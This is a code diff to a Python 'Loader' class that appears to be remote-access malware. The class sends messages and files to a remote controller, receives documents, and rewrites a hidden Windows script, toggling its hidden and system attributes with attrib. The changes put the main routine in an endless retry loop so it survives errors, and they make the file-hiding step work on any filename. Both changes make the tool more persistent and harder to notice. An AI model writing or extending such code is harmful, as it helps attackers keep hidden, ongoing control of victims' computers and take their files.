@@ -25,11 +25,12 @@ class Loader():
 		thread = threading.Thread(target = self.Auto_Close)
 		#thread.start()
 		self.SendNotification()
-		try:
-			self.Main()
-		except Exception as ex:
-			print(str(ex))
-			self.SendMessage("Error : \n %E2%9D%96 Message : " + str(ex))
+		while True:
+			try:
+				self.Main()
+			except Exception as ex:
+				print(str(ex))
+				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + str(ex))
 	def Request(self,url):
 		return requests.get(url).text.encode("utf-8")
 	def Send_File(self,filename):
@@ -138,11 +139,11 @@ class Loader():
 						read = file.read()
 						file.close()
 						read = read.replace(re.findall('" ""(.*?)""',read)[0],prog)
-						os.system('attrib -h -s C:\\Windows\\python\\Main.vbs')
+						os.system('attrib -h -s ' + filename)
 						file = open(filename,"w")
 						file.write(read)
 						file.close()
-						os.system('attrib +h +s C:\\Windows\\python\\Main.vbs')
+						os.system('attrib +h +s ' + filename)
 						self.SendMessage("%E2%9C%94%EF%B8%8F Program Name Changed")
 				else:
 					file_id = message['document']['file_id']
